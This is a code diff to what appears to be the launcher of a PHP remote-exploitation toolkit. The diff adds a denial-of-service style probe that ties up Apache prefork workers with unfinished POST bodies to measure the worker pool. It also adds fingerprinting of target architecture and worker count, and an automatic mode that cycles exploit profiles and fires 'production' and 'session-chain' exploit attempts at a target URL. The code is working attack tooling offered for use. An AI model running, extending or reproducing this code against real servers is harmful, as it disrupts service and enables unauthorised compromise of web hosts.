@@ -38,7 +38,7 @@ from profile_db import (
     profile_requirements_ok,
     recommended_huge_mb,
 )
-from production_exploit import VERSION_OFFSETS
+from production_exploit import VERSION_OFFSETS, open_socket
 from fpm_db import (
     command as fpm_command,
     format_matches as format_fpm_matches,
@@ -145,6 +145,87 @@ class HttpClient:
 
 
 # ---------------------------------------------------------------------------
+# Active worker-count probe
+
+
+def _tls_context(insecure: bool) -> ssl.SSLContext:
+    context = ssl.create_default_context()
+    if insecure:
+        context.check_hostname = False
+        context.verify_mode = ssl.CERT_NONE
+    return context
+
+
+def probe_prefork_workers(url: str, *, insecure: bool = False,
+                          limit: int = 256,
+                          probe_timeout: float = 3.0) -> int | None:
+    """Measure the Apache prefork pool without sending a complete request.
+
+    Each holder sends multipart headers and one byte of a declared 1 MiB body,
+    tying up one prefork child.  A separate GET succeeds exactly while at least
+    one child remains free.  Binary search over the number of holders recovers
+    MaxRequestWorkers.  The probe is disruptive for the duration of the search
+    but does not OOM or modify target files.
+    """
+    parts = urllib.parse.urlsplit(url)
+    if parts.scheme not in ("http", "https") or not parts.hostname:
+        return None
+    host = parts.hostname
+    port = parts.port or (443 if parts.scheme == "https" else 80)
+    path = parts.path or "/"
+    if parts.query:
+        path += "?" + parts.query
+    host_header = host if port in (80, 443) else f"{host}:{port}"
+    tls = _tls_context(insecure) if parts.scheme == "https" else None
+    holders: list[Any] = []
+
+    def hold_one() -> None:
+        sock = open_socket(host, port, 2.0, tls, host)
+        try:
+            sock.sendall(
+                f"POST {path} HTTP/1.1\r\nHost: {host_header}\r\n"
+                "Content-Type: application/x-www-form-urlencoded\r\n"
+                "Content-Length: 1048576\r\n\r\nx".encode())
+        except OSError:
+            sock.close()
+            raise
+        holders.append(sock)
+
+    def has_free(count: int) -> bool:
+        try:
+            for _ in range(count):
+                hold_one()
+            time.sleep(2.0)
+            probe = HttpClient(url, timeout=probe_timeout,
+                               insecure=insecure, max_body=4096)
+            try:
+                probe.request("GET", follow=False)
+                return True
+            except (OSError, http.client.HTTPException, ValueError):
+                return False
+        except OSError:
+            return False
+        finally:
+            for sock in holders:
+                try:
+                    sock.close()
+                except OSError:
+                    pass
+            holders.clear()
+
+    if not has_free(1):
+        return 1
+    low, high = 1, limit
+    while low < high:
+        mid = (low + high + 1) // 2
+        if has_free(mid):
+            low = mid
+        else:
+            high = mid - 1
+    return limit if low >= limit else low + 1
+
+
+# ---------------------------------------------------------------------------
 # Passive parsing
 
 
@@ -159,6 +240,15 @@ _OS_PATTERNS = (
     re.compile(r"\b(Debian|Ubuntu|Alpine|CentOS|Red Hat|Amazon|openSUSE|FreeBSD|Windows)\b", re.I),
 )
 _COOKIE_RE = re.compile(r"(?:^|;\s*)([^=;\s]+)=")
+_ARCH_PATTERNS = (
+    re.compile(r"\b(x86_64|amd64)\b", re.I),
+    re.compile(r"\b(aarch64|arm64)\b", re.I),
+)
+_WORKER_HEADERS = ("x-workers", "x-worker-count", "x-prefork-workers",
+                   "x-max-workers")
+_WORKER_BODY_RE = re.compile(
+    r"\b(?:MaxRequestWorkers|prefork\s+workers?)\s*[=:]\s*(\d{1,4})",
+    re.I)
 
 
 def _first_version(texts: list[str]) -> str | None:
@@ -247,6 +337,27 @@ def parse_passive(resp: ProbeResponse) -> dict[str, Any]:
     if m:
         generator = m.group(1)[:120]
 
+    arch_hint = ""
+    for text in (server, xpb, via, body):
+        for pattern in _ARCH_PATTERNS:
+            m = pattern.search(text)
+            if m:
+                arch_hint = m.group(1)
+                break
+        if arch_hint:
+            break
+
+    workers_hint = None
+    for name in _WORKER_HEADERS:
+        value = resp.header(name).strip()
+        if value.isdigit() and int(value) > 0:
+            workers_hint = int(value)
+            break
+    if workers_hint is None:
+        m = _WORKER_BODY_RE.search(body)
+        if m:
+            workers_hint = int(m.group(1))
+
     return {
         "requested_url": resp.url,
         "status": resp.status,
@@ -258,6 +369,8 @@ def parse_passive(resp: ProbeResponse) -> dict[str, Any]:
         "php_version": version,
         "php_exposed": bool(version),
         "distro": distro,
+        "arch_hint": arch_hint,
+        "workers_hint": workers_hint,
         "sapi_hint": sapi_hint,
         "sapi": sapi,
         "sapi_detail": sapi_detail,
@@ -512,6 +625,35 @@ def _production_rows(candidates: list[dict[str, Any]]) -> list[str]:
     return rows
 
 
+def auto_candidates(fp: dict[str, Any], args: argparse.Namespace,
+                    arches: list[str]) -> list[dict[str, Any]]:
+    """Expand production profiles across unknown worker counts and arches."""
+    known_workers = (args.production_workers or args.workers or
+                     fp.get("workers"))
+    workers = ([int(known_workers)] if known_workers
+               else [1, 2, 150])
+    candidates: list[dict[str, Any]] = []
+    seen: set[tuple[str, int]] = set()
+    for arch in arches:
+        for profile in production_candidates(fp, arch):
+            for count in workers:
+                key = (profile["name"], count)
+                if key in seen:
+                    continue
+                seen.add(key)
+                candidates.append(dict(profile, chain="production",
+                                       workers=count))
+    seen_names: set[str] = set()
+    for arch in arches:
+        for profile in priority_candidates(fp, arch=arch):
+            key = profile["name"]
+            if key in seen_names:
+                continue
+            seen_names.add(key)
+            candidates.append(dict(profile, chain="session"))
+    return candidates
+
+
 def _choose_profile(args, matches: list[dict[str, Any]]) -> dict[str, Any]:
     if args.profile:
         chosen = load_profile(args.profile)
@@ -587,6 +729,10 @@ def main() -> int:
     ap.add_argument("--limit", type=int, default=8)
     ap.add_argument("--run", action="store_true",
                     help="run session_exploit.py with the selected profile")
+    ap.add_argument("--auto", action="store_true",
+                    help="try unknown architecture and worker-count variants; "
+                         "with --run, actively probe the Apache prefork pool "
+                         "unless --workers/--production-workers is given")
     ap.add_argument("--fallback", action="store_true",
                     help="try the priority profile queue when the exact build is unknown")
     ap.add_argument("--try-all", action="store_true",
@@ -622,7 +768,7 @@ def main() -> int:
     if not args.url:
         ap.error("-u/--url is required unless --list-profiles is used")
 
-    arch = None if args.arch == "auto" else normalize_arch(args.arch)
+    arch_override = None if args.arch == "auto" else normalize_arch(args.arch)
     client = HttpClient(args.url, timeout=args.timeout, insecure=args.insecure)
     try:
         resp = client.request("GET", follow=True)
@@ -631,6 +777,9 @@ def main() -> int:
         return 2
 
     fp = parse_passive(resp)
+    arch = arch_override or normalize_arch(fp.get("arch_hint"))
+    if args.workers is None and fp.get("workers_hint"):
+        args.workers = int(fp["workers_hint"])
     fp["arch"] = arch or "unknown"
     fp["workers"] = args.workers
     fp["memory_limit"] = (args.memory_limit_mb << 20
@@ -666,6 +815,21 @@ def main() -> int:
         fp["memory_probe"] = probe_memory_limit(client, None, args.probe_mb)
         if fp["memory_probe"].get("limit_bytes"):
             fp["memory_limit"] = fp["memory_probe"]["limit_bytes"]
+
+    if (args.auto and args.run and not persistent and not args.profile and
+            args.workers is None and args.production_workers is None and
+            (fp.get("sapi") == "apache2handler" or
+             (fp.get("sapi_hint") or "").lower() == "apache")):
+        print("[*] auto: probing Apache prefork worker count", flush=True)
+        detected = probe_prefork_workers(args.url, insecure=args.insecure,
+                                         probe_timeout=min(3.0, args.timeout))
+        if detected:
+            args.workers = detected
+            fp["workers"] = detected
+            print(f"[+] auto: detected workers={detected}", flush=True)
+        else:
+            print("[!] auto: worker probe failed; will try 1, 2, and 150",
+                  flush=True)
 
     matches = match_profiles(fp, arch=arch, limit=args.limit)
     prod_candidates = ([] if persistent else
@@ -790,6 +954,30 @@ def main() -> int:
             except (ValueError, SystemExit) as exc:
                 print(f"[-] profile: {exc}", file=sys.stderr)
                 return 1
+        elif args.auto:
+            auto_arches = ([arch] if arch else ["x86_64", "aarch64"])
+            candidates = auto_candidates(fp, args, auto_arches)
+            if not candidates:
+                print("[-] auto: no runnable production or session profile for "
+                      "the detected target", file=sys.stderr)
+                return 1
+            prod_worker_values = list(dict.fromkeys(
+                str(c["workers"]) for c in candidates
+                if c.get("chain") == "production"))
+            if not prod_worker_values and fp.get("workers"):
+                prod_worker_values = [str(fp["workers"])]
+            print(f"[*] auto priority: arches={','.join(auto_arches)} "
+                  f"workers={','.join(prod_worker_values) or 'auto'}",
+                  flush=True)
+            for i, candidate in enumerate(candidates, 1):
+                if candidate.get("chain") == "production":
+                    print(f"  {i}. {candidate['name']} "
+                          f"({candidate['php_version']}/x86_64, "
+                          f"stock-production, workers={candidate['workers']})")
+                else:
+                    print(f"  {i}. {candidate['name']} "
+                          f"({candidate['php_version']}/"
+                          f"{candidate['arch']}, session-chain)")
         elif args.fallback or args.try_all:
             session_candidates = [
                 dict(candidate, chain="session")
@@ -831,7 +1019,7 @@ def main() -> int:
                 candidates = [dict(chosen, chain="session")]
 
         if (prod_candidates and args.workers is None and
-                args.production_workers is None and
+                args.production_workers is None and not args.auto and
                 any(c.get("chain") == "production" for c in candidates)):
             print(f"[*] production worker count defaults to {prod_workers}; "
                   f"pass --workers or --production-workers for a different pool",
@@ -839,11 +1027,12 @@ def main() -> int:
 
         for index, chosen in enumerate(candidates, 1):
             if chosen.get("chain") == "production":
+                chosen_workers = int(chosen.get("workers") or prod_workers)
                 command = production_command(
-                    chosen, args.url, args, prod_workers)
+                    chosen, args.url, args, chosen_workers)
                 print(f"[*] attempt {index}/{len(candidates)}: "
                       f"{chosen['name']} (stock-production, "
-                      f"workers={prod_workers})", flush=True)
+                      f"workers={chosen_workers})", flush=True)
             else:
                 huge = recommended_huge_mb(chosen, fp.get("memory_limit"))
                 cmd = args.cmd
